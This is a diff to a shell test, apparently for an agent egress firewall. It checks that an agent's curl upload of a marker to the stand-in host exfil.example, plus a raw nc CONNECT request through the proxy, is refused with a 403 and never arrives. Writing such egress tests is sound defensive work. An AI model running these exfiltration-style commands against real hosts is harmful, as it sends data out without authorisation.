@@ -10,17 +10,20 @@ positive_control laurent-bot
 since="$(now_iso)"; marker="s01-$(rand_hex)"
 
 t0="$(now_ms)"
-out="$(agent_sh laurent-bot "curl -sS -i --max-time 10 -d '$marker' https://exfil.example/upload" 2>&1 || true)"
+out="$(agent_sh laurent-bot "curl -sS -i --max-time 10 -d '$marker' https://exfil.example/upload" 2>/dev/null || true)"
 elapsed=$(( $(now_ms) - t0 ))
 status="$(printf '%s' "$out" | sed -n 's/^HTTP\/[0-9.]* \([0-9]*\).*/\1/p' | tail -n1)"
-evidence "HTTP $status in ${elapsed} ms"
+evidence "HTTPS through the proxy: HTTP $status in ${elapsed} ms (denied on CONNECT)"
 evidence "header: $(printf '%s' "$out" | grep -i '^x-agents-firewall:' | tr -d '\r' || echo none)"
-body="$(printf '%s' "$out" | tr -d '\r' | sed -n '/^$/,$p' | sed '1d' | tail -n1)"
+# curl never prints the body of a refused CONNECT: read the EF-21 message on the wire.
+raw="$(agent_sh laurent-bot "printf 'CONNECT exfil.example:443 HTTP/1.1\r\nHost: exfil.example:443\r\n\r\n' | nc -w 3 $GATEWAY_IP 3128" 2>/dev/null || true)"
+body="$(printf '%s' "$raw" | tr -d '\r' | sed -n '/^$/,$p' | sed '1d' | tail -n1)"
 evidence "body: $body"
 
 [ "$status" = 403 ] || fail "expected HTTP 403, got '${status:-none}'"
 printf '%s' "$out" | grep -qi '^x-agents-firewall: *denied' || fail "header X-Agents-Firewall: denied missing"
-printf '%s' "$body" | grep -Eq '^blocked by agents-firewall: exfil\.example(:443)? not allowed for laurent-bot \(rule [0-9]+\)$' ||
+# EF-21: destination, agent and rule (number, or the implicit rule's name for the final cleanup).
+printf '%s' "$body" | grep -Eq '^blocked by agents-firewall: exfil\.example(:443)? not allowed for laurent-bot \(rule ([0-9]+|default-deny)\)$' ||
   fail "unexpected denial body"
 [ "$elapsed" -lt 2000 ] || fail "denial took ${elapsed} ms (expected immediate, < 2 s)"
 assert_not_received exfil "$marker" "the request"
